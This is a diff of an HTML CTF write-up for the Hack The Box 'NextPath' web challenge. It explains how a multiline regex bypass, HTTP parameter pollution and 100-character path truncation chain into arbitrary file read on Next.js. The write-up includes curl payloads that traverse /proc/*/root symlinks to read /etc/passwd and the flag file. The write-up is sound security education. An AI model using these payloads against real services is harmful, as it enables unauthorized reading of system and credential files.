@@ -4,600 +4,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NextPath — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <title>NextPath - HTB CTF Writeup | Abdelaaziz Belkhair</title>
     <meta name="description"
-        content="HTB CTF Writeup: NextPath — Chaining multiline regex, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.">
+        content="HTB CTF Writeup: NextPath - Chaining multiline regex, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/writeups/nextpath.html">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/writeups/nextpath.html">
+  <meta property="og:title" content="NextPath - HTB CTF Writeup | Abdelaaziz Belkhair">
+  <meta property="og:description" content="HTB CTF Writeup: NextPath - Chaining multiline regex, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="NextPath - HTB CTF Writeup | Abdelaaziz Belkhair">
+  <meta name="twitter:description" content="HTB CTF Writeup: NextPath - Chaining multiline regex, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
-        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
         integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
         crossorigin="anonymous" referrerpolicy="no-referrer">
-    <style>
-        :root {
-            --primary: #00d4ff;
-            --accent: #ff6b6b;
-            --success: #00ff88;
-            --bg: #0a0a0a;
-            --bg-card: #111111;
-            --bg-terminal: #0d0d0d;
-            --text: #e4e4e7;
-            --text-secondary: #a1a1aa;
-            --text-muted: #71717a;
-            --border: #27272a;
-            --orange: #f97316;
-            --purple: #a78bfa;
-        }
-
-        *,
-        *::before,
-        *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            line-height: 1.8;
-        }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        a {
-            color: var(--primary);
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-
-        a:hover {
-            color: var(--success);
-        }
-
-        /* ── Header ── */
-        header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 100;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid var(--border);
-        }
-
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 24px;
-            max-width: 1100px;
-            margin: 0 auto;
-        }
-
-        .logo {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 1.75rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-
-        main {
-            padding-top: 100px;
-            padding-bottom: 60px;
-        }
-
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: var(--text-secondary);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .back-link:hover {
-            color: var(--primary);
-        }
-
-        /* ── Challenge Card (HTB-style) ── */
-        .challenge-card {
-            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 2rem 2.5rem;
-            margin-bottom: 2rem;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .challenge-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
-        }
-
-        .challenge-card::after {
-            content: '';
-            position: absolute;
-            top: -60px;
-            right: -60px;
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
-        .challenge-platform {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--success);
-            background: rgba(0, 255, 136, 0.1);
-            padding: 0.3rem 0.75rem;
-            border-radius: 20px;
-            margin-bottom: 1rem;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .challenge-title {
-            font-size: 2.2rem;
-            font-weight: 700;
-            line-height: 1.2;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .challenge-subtitle {
-            color: var(--text-secondary);
-            font-size: 1.05rem;
-            margin-bottom: 1.5rem;
-            max-width: 650px;
-        }
-
-        .challenge-meta {
-            display: flex;
-            gap: 0.6rem;
-            flex-wrap: wrap;
-            margin-bottom: 1.5rem;
-        }
-
-        .meta-badge {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            padding: 0.3rem 0.7rem;
-            border-radius: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            font-weight: 600;
-        }
-
-        .meta-badge.date {
-            color: var(--primary);
-            background: rgba(0, 212, 255, 0.12);
-        }
-
-        .meta-badge.category {
-            color: var(--purple);
-            background: rgba(167, 139, 250, 0.12);
-        }
-
-        .meta-badge.tag {
-            color: var(--orange);
-            background: rgba(249, 115, 22, 0.12);
-        }
-
-        .challenge-stats {
-            display: flex;
-            gap: 1px;
-            background: var(--border);
-            border-radius: 12px;
-            overflow: hidden;
-            margin-top: 0.5rem;
-        }
-
-        .stat-item {
-            flex: 1;
-            padding: 1rem;
-            text-align: center;
-            background: var(--bg-card);
-        }
-
-        .stat-item:first-child {
-            border-radius: 12px 0 0 12px;
-        }
-
-        .stat-item:last-child {
-            border-radius: 0 12px 12px 0;
-        }
-
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.3rem;
-            font-weight: 700;
-            display: block;
-        }
-
-        .stat-value.difficulty-medium {
-            color: var(--orange);
-        }
-
-        .stat-value.difficulty-hard {
-            color: var(--accent);
-        }
-
-        .stat-value.difficulty-easy {
-            color: var(--success);
-        }
-
-        .stat-value.impact {
-            color: var(--accent);
-        }
-
-        .stat-value.vulns {
-            color: var(--primary);
-        }
-
-        .stat-label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 0.25rem;
-        }
-
-        /* ── Table of Contents ── */
-        .toc {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 1.25rem 1.5rem;
-            margin-bottom: 2rem;
-        }
-
-        .toc-title {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 0.75rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .toc-title::before {
-            content: '';
-            width: 12px;
-            height: 2px;
-            background: var(--orange);
-        }
-
-        .toc ol {
-            list-style: none;
-            counter-reset: toc-counter;
-            padding: 0;
-            margin: 0;
-        }
-
-        .toc li {
-            counter-increment: toc-counter;
-            margin-bottom: 0.25rem;
-        }
-
-        .toc li a {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            padding: 0.35rem 0.5rem;
-            border-radius: 6px;
-            transition: all 0.15s;
-        }
-
-        .toc li a:hover {
-            color: var(--orange);
-            background: rgba(249, 115, 22, 0.06);
-        }
-
-        .toc li a::before {
-            content: counter(toc-counter, decimal-leading-zero);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            min-width: 20px;
-        }
-
-        /* ── Article Content ── */
-        .article-content h2 {
-            font-size: 1.35rem;
-            margin: 2.5rem 0 1rem;
-            color: var(--text);
-            padding-bottom: 0.6rem;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-
-        .article-content h2::before {
-            content: '';
-            width: 4px;
-            height: 22px;
-            background: var(--orange);
-            border-radius: 2px;
-            flex-shrink: 0;
-        }
-
-        .article-content h3 {
-            font-size: 1.1rem;
-            margin: 1.5rem 0 0.75rem;
-            color: var(--text);
-        }
-
-        .article-content h4 {
-            font-size: 0.95rem;
-            margin: 1.25rem 0 0.5rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content p {
-            margin-bottom: 1rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content ul,
-        .article-content ol {
-            margin: 1rem 0;
-            padding-left: 1.5rem;
-            color: var(--text-secondary);
-        }
-
-        .article-content li {
-            margin-bottom: 0.5rem;
-        }
-
-        /* ── Code Blocks ── */
-        .article-content pre {
-            background: var(--bg-terminal);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            padding: 1.25rem 1.25rem 1.25rem;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            line-height: 1.6;
-            position: relative;
-        }
-
-        .article-content pre::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
-            border-radius: 10px 10px 0 0;
-        }
-
-        .article-content code {
-            font-family: 'JetBrains Mono', monospace;
-            background: rgba(249, 115, 22, 0.1);
-            padding: 0.15rem 0.45rem;
-            border-radius: 4px;
-            font-size: 0.83em;
-            color: var(--orange);
-        }
-
-        .article-content pre code {
-            background: none;
-            padding: 0;
-            color: var(--text-secondary);
-        }
-
-        /* ── Info & Warning Boxes ── */
-        .info-box {
-            background: rgba(0, 212, 255, 0.06);
-            border: 1px solid rgba(0, 212, 255, 0.15);
-            border-left: 3px solid var(--primary);
-            padding: 1.25rem 1.5rem;
-            border-radius: 0 10px 10px 0;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        .warning-box {
-            background: rgba(255, 107, 107, 0.06);
-            border: 1px solid rgba(255, 107, 107, 0.15);
-            border-left: 3px solid var(--accent);
-            padding: 1.25rem 1.5rem;
-            border-radius: 0 10px 10px 0;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        /* ── Tables ── */
-        table {
-            width: 100%;
-            border-collapse: separate;
-            border-spacing: 0;
-            margin: 1.5rem 0;
-            font-size: 0.85rem;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid var(--border);
-        }
-
-        th,
-        td {
-            padding: 0.7rem 1rem;
-            text-align: left;
-        }
-
-        th {
-            background: var(--bg-terminal);
-            color: var(--primary);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.78rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        td {
-            color: var(--text-secondary);
-            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
-        }
-
-        tr:last-child td {
-            border-bottom: none;
-        }
-
-        tr:hover td {
-            background: rgba(249, 115, 22, 0.03);
-        }
-
-        td code {
-            font-size: 0.8em;
-        }
-
-        hr {
-            border: none;
-            border-top: 1px solid var(--border);
-            margin: 2rem 0;
-        }
-
-        /* ── Pwned Banner ── */
-        .pwned-banner {
-            text-align: center;
-            padding: 2.5rem 2rem;
-            margin: 3rem 0 1rem;
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
-            border: 1px solid rgba(0, 255, 136, 0.2);
-            border-radius: 16px;
-            position: relative;
-        }
-
-        .pwned-banner::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--success), var(--primary));
-        }
-
-        .pwned-icon {
-            font-size: 2.5rem;
-            margin-bottom: 0.75rem;
-            display: block;
-        }
-
-        .pwned-text {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--success);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-        }
-
-        .pwned-sub {
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            margin-top: 0.5rem;
-        }
-
-        /* ── Footer ── */
-        footer {
-            padding: 1.5rem 0;
-            border-top: 1px solid var(--border);
-            text-align: center;
-        }
-
-        footer p {
-            color: var(--text-muted);
-            font-size: 0.8rem;
-        }
-
-        /* ── Responsive ── */
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-            }
-
-            .challenge-title {
-                font-size: 1.6rem;
-            }
-
-            .challenge-card {
-                padding: 1.5rem;
-            }
-
-            .challenge-stats {
-                flex-wrap: wrap;
-            }
-
-            .stat-item {
-                min-width: 80px;
-            }
-
-            table {
-                font-size: 0.75rem;
-            }
-
-            th,
-            td {
-                padding: 0.4rem 0.6rem;
-            }
-
-            .toc {
-                display: none;
-            }
-        }
-    </style>
+    <link rel="stylesheet" href="../assets/css/writeup.css">
 </head>
 
 <body>
@@ -605,16 +31,18 @@
         <nav>
             <a href="../index.html" class="logo">AB_</a>
             <ul class="nav-links">
-                <li><a href="../index.html">Accueil</a></li>
-                <li><a href="../blog.html">Blog</a></li>
-                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#snapshot">Profil</a></li>
+                <li><a href="../projects.html">Travail</a></li>
+                <li><a href="../writeups.html" class="active">Writeups</a></li>
+                <li><a href="../blog.html">Articles</a></li>
                 <li><a href="../index.html#contact">Contact</a></li>
-            </ul>
+              <li><a href="../cv.pdf" download>CV</a></li>
+  </ul>
         </nav>
     </header>
 
     <main class="container">
-        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux analyses</a>
 
         <article>
             <div class="challenge-card">
@@ -630,7 +58,7 @@
                 </div>
                 <div class="challenge-stats">
                     <div class="stat-item">
-                        <span class="stat-value difficulty-hard">Medium–Hard</span>
+                        <span class="stat-value difficulty-hard">Medium-Hard</span>
                         <span class="stat-label">Difficulty</span>
                     </div>
                     <div class="stat-item">
@@ -651,11 +79,11 @@
             <nav class="toc">
                 <div class="toc-title">Table of Contents</div>
                 <ol>
-                    <li><a href="#s1">Reconnaissance — Source Code Analysis</a></li>
+                    <li><a href="#s1">Reconnaissance - Source Code Analysis</a></li>
                     <li><a href="#s2">Vulnerability Identification</a></li>
-                    <li><a href="#s3">Proof of Concept — /etc/passwd</a></li>
-                    <li><a href="#s4">The /flag.txt Problem — Modular Arithmetic</a></li>
-                    <li><a href="#s5">The Solution — /proc/thread-self/root</a></li>
+                    <li><a href="#s3">Proof of Concept - /etc/passwd</a></li>
+                    <li><a href="#s4">The /flag.txt Problem - Modular Arithmetic</a></li>
+                    <li><a href="#s5">The Solution - /proc/thread-self/root</a></li>
                     <li><a href="#s6">Full Attack Chain Summary</a></li>
                     <li><a href="#s7">Remediation</a></li>
                 </ol>
@@ -666,12 +94,12 @@
                 <div class="info-box">
                     <strong>Challenge</strong>: NextPath<br>
                     <strong>Category</strong>: Web Exploitation<br>
-                    <strong>Difficulty</strong>: Medium–Hard<br>
+                    <strong>Difficulty</strong>: Medium-Hard<br>
                     <strong>Flag</strong>: <code>HTB{REDACTED}</code><br>
-                    <strong>Target</strong>: <code>http://154.57.164.80:32580</code>
+                    <strong>Target</strong>: <code>http://TARGET:PORT</code>
                 </div>
 
-                <h2 id="s1">1. Reconnaissance — Source Code Analysis</h2>
+                <h2 id="s1">1. Reconnaissance - Source Code Analysis</h2>
 
                 <p>The challenge provides a <strong>Next.js</strong> application with a single API endpoint at
                     <code>/api/team</code>. Examining the source code:
@@ -736,7 +164,7 @@ CMD ["npm", "start"]</code></pre>
                     <code>/api/team</code> endpoint.
                 </p>
 
-                <h2 id="s2">2. Vulnerability Identification — Three Security Flaws</h2>
+                <h2 id="s2">2. Vulnerability Identification - Three Security Flaws</h2>
 
                 <p>The handler has <strong>three</strong> distinct bugs that chain together into a full arbitrary file
                     read.</p>
@@ -772,7 +200,7 @@ CMD ["npm", "start"]</code></pre>
 
                 <p><strong>Example</strong>: Input = <code>1337\nmalicious_payload</code></p>
                 <ul>
-                    <li>Line 1: <code>1337</code> → matches <code>^[0-9]+$</code> ✓</li>
+                    <li>Line 1: <code>1337</code> → matches <code>^[0-9]+$</code> OK</li>
                     <li>Line 2: <code>malicious_payload</code> → never checked</li>
                 </ul>
 
@@ -791,11 +219,11 @@ CMD ["npm", "start"]</code></pre>
                     inside the string elements.</p>
 
                 <pre><code>// String behavior (what the developer expected):
-"../../etc/passwd".includes("/")   // → true ✓ (catches traversal)
+"../../etc/passwd".includes("/")   // → true OK (catches traversal)
 
 // Array behavior (what actually happens):
-["1337\n", "../../etc/passwd"].includes("/")   // → false ✗ (no element === "/")
-["1337\n", "../../etc/passwd"].includes("..")  // → false ✗ (no element === "..")</code></pre>
+["1337\n", "../../etc/passwd"].includes("/")   // → false not OK (no element === "/")
+["1337\n", "../../etc/passwd"].includes("..")  // → false not OK (no element === "..")</code></pre>
 
                 <p>Neither array element is the single character <code>"/"</code> or the two-character string
                     <code>".."</code>, so the traversal check is completely bypassed.
@@ -819,14 +247,14 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
 
                 <p>Then <code>path.join("team", ...)</code> normalizes the path, and <code>filepath.slice(0, 100)</code>
                     truncates to 100 characters. If the path is crafted so that <code>/etc/passwd</code> ends at exactly
-                    character 100, the <code>.png</code> extension (characters 101–104) is <strong>cleanly
+                    character 100, the <code>.png</code> extension (characters 101-104) is <strong>cleanly
                         amputated</strong>.</p>
 
-                <h2 id="s3">3. Proof of Concept — Reading <code>/etc/passwd</code></h2>
+                <h2 id="s3">3. Proof of Concept - Reading <code>/etc/passwd</code></h2>
 
                 <h3>Payload</h3>
 
-                <pre><code>curl -v "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/etc/passwd"</code></pre>
+                <pre><code>curl -v "http://TARGET:PORT/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/etc/passwd"</code></pre>
 
                 <h3>How It Works Step by Step</h3>
 
@@ -840,15 +268,15 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
 
                 <p><code>ID_REGEX.test(["1337\n", "..."])</code> coerces the array to string:
                     <code>"1337\n,../../../../..."</code>. The <code>m</code> flag finds <code>1337</code> on line 1 →
-                    <strong>passes</strong> ✓
+                    <strong>passes</strong> OK
                 </p>
 
                 <h4>Step 3: Traversal Check Bypass</h4>
 
-                <pre><code>["1337\n", "../../../../..."].includes("/")   // false — no element === "/"
-["1337\n", "../../../../..."].includes("..")  // false — no element === ".."</code></pre>
+                <pre><code>["1337\n", "../../../../..."].includes("/")   // false - no element === "/"
+["1337\n", "../../../../..."].includes("..")  // false - no element === ".."</code></pre>
 
-                <p><strong>Bypassed</strong> ✓</p>
+                <p><strong>Bypassed</strong> OK</p>
 
                 <h4>Step 4: Path Construction &amp; Normalization</h4>
 
@@ -967,7 +395,7 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                         <tr>
                             <td><code>/passwd</code></td>
                             <td>7</td>
-                            <td><strong>100</strong> ← 🎯</td>
+                            <td><strong>100</strong> ← target</td>
                         </tr>
                         <tr>
                             <td><code>.png</code></td>
@@ -990,7 +418,7 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                             <code>/</code></strong></li>
                     <li>Each <code>proc/1/root</code> → <code>/proc/1/root</code> → <strong>symlink to
                             <code>/</code></strong></li>
-                    <li><code>etc/passwd</code> → <code>/etc/passwd</code> ✓</li>
+                    <li><code>etc/passwd</code> → <code>/etc/passwd</code> OK</li>
                 </ol>
 
                 <div class="info-box">
@@ -998,14 +426,14 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                         <code>/</code></strong>: These are kernel-maintained symlinks in procfs.
                     <code>/proc/self/root</code> points to the root filesystem of the current process, and
                     <code>/proc/1/root</code> points to PID 1's root filesystem. In a standard container, both resolve
-                    to <code>/</code>. Crucially, <code>path.normalize</code> doesn't know about symlinks — it treats
+                    to <code>/</code>. Crucially, <code>path.normalize</code> doesn't know about symlinks - it treats
                     <code>proc/self/root</code> as three literal directory names. Only the OS resolves the symlinks at
                     read time.
                 </div>
 
-                <p><strong>Result</strong>: <code>/etc/passwd</code> is read successfully ✓</p>
+                <p><strong>Result</strong>: <code>/etc/passwd</code> is read successfully OK</p>
 
-                <h2 id="s4">4. The <code>/flag.txt</code> Problem — Modular Arithmetic Lock</h2>
+                <h2 id="s4">4. The <code>/flag.txt</code> Problem - Modular Arithmetic Lock</h2>
 
                 <p>Attempting the same technique for <code>/flag.txt</code> hits a mathematical wall.</p>
 
@@ -1051,17 +479,17 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                 <h3>Why <code>/etc/passwd</code> Worked</h3>
 
                 <pre><code>/etc/passwd = 11 chars → padding = 100 - 2 - 11 = 87
-87 mod 3 = 0 ✓ → 87 = 15 + 12×6 = 15 + 72</code></pre>
+87 mod 3 = 0 OK → 87 = 15 + 12×6 = 15 + 72</code></pre>
 
                 <h3>Proof of Failure</h3>
 
                 <p>Testing the closest approximation:</p>
 
-                <pre><code>curl -s "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/flag.txt"</code></pre>
+                <pre><code>curl -s "http://TARGET:PORT/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/flag.txt"</code></pre>
 
                 <p><strong>Error</strong>: <code>open '../.../proc/1/root/flag.txt.p'</code></p>
 
-                <p>The <code>.p</code> (first character of <code>.png</code>) leaks through — the path is <strong>98
+                <p>The <code>.p</code> (first character of <code>.png</code>) leaks through - the path is <strong>98
                         chars</strong>, 2 short. The truncation catches <code>flag.txt.p</code> instead of clean
                     <code>flag.txt</code>.
                 </p>
@@ -1082,35 +510,35 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                         <tr>
                             <td><code>/flag</code></td>
                             <td>5</td>
-                            <td>2 ✓</td>
+                            <td>2 OK</td>
                             <td></td>
-                            <td>ENOENT — file doesn't exist</td>
+                            <td>ENOENT - file doesn't exist</td>
                         </tr>
                         <tr>
                             <td><code>/root/flag.txt</code></td>
                             <td>14</td>
-                            <td>2 ✓</td>
+                            <td>2 OK</td>
                             <td></td>
-                            <td>EACCES — <code>/root/</code> is mode 700</td>
+                            <td>EACCES - <code>/root/</code> is mode 700</td>
                         </tr>
                         <tr>
                             <td><code>/home/flag.txt</code></td>
                             <td>14</td>
-                            <td>2 ✓</td>
+                            <td>2 OK</td>
                             <td></td>
-                            <td>ENOENT — doesn't exist</td>
+                            <td>ENOENT - doesn't exist</td>
                         </tr>
                         <tr>
                             <td><code>/proc/1/cwd/flag.txt</code></td>
                             <td>20</td>
-                            <td>2 ✓</td>
+                            <td>2 OK</td>
                             <td></td>
-                            <td>ENOENT — CWD is <code>/app</code>, not <code>/</code></td>
+                            <td>ENOENT - CWD is <code>/app</code>, not <code>/</code></td>
                         </tr>
                     </tbody>
                 </table>
 
-                <h2 id="s5">5. The Solution — <code>/proc/thread-self/root</code></h2>
+                <h2 id="s5">5. The Solution - <code>/proc/thread-self/root</code></h2>
 
                 <h3>Discovery</h3>
 
@@ -1165,15 +593,15 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                 <p>We need: <code>22a + 15b + 12c = 89</code></p>
 
                 <p>Setting <code>a = 2</code>: <code>89 - 44 = 45</code><br>
-                    Setting <code>b = 3</code>: <code>45 - 45 = 0</code> ✓</p>
+                    Setting <code>b = 3</code>: <code>45 - 45 = 0</code> OK</p>
 
                 <p><strong>Solution</strong>: 2× <code>/proc/thread-self/root</code> + 3× <code>/proc/self/root</code> =
-                    <code>44 + 45 = 89</code> ✓
+                    <code>44 + 45 = 89</code> OK
                 </p>
 
                 <h3>Final Payload</h3>
 
-                <pre><code>curl -s "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt"</code></pre>
+                <pre><code>curl -s "http://TARGET:PORT/api/team?id=1337%0a&amp;id=../../../../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt"</code></pre>
 
                 <h3>Character Count Verification</h3>
 
@@ -1222,7 +650,7 @@ const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>
                         <tr>
                             <td><code>/flag.txt</code></td>
                             <td>9</td>
-                            <td><strong>100</strong> ✓</td>
+                            <td><strong>100</strong> OK</td>
                         </tr>
                     </tbody>
                 </table>
@@ -1239,7 +667,7 @@ proc/thread-self/root     →  /   (same)
 proc/self/root            →  /   (symlink → /)
 proc/self/root            →  /   (same)
 proc/self/root            →  /   (same)
-flag.txt                  →  /flag.txt ✓</code></pre>
+flag.txt                  →  /flag.txt OK</code></pre>
 
                 <h3>Result</h3>
 
@@ -1297,7 +725,7 @@ flag.txt                  →  /flag.txt ✓</code></pre>
                 </table>
 
                 <div class="pwned-banner">
-                    <span class="pwned-icon">🏴</span>
+                    <span class="pwned-icon"><i class="fas fa-flag"></i></span>
                     <div class="pwned-text">Machine Pwned</div>
                     <p class="pwned-sub">Regex Bypass → HPP → Path Truncation → Flag captured</p>
                 </div>
@@ -1308,7 +736,7 @@ flag.txt                  →  /flag.txt ✓</code></pre>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 Abdelaaziz Belkhair</p>
+            <p>&copy; 2026 Abdelaaziz Belkhair</p>
         </div>
     </footer>
 </body>
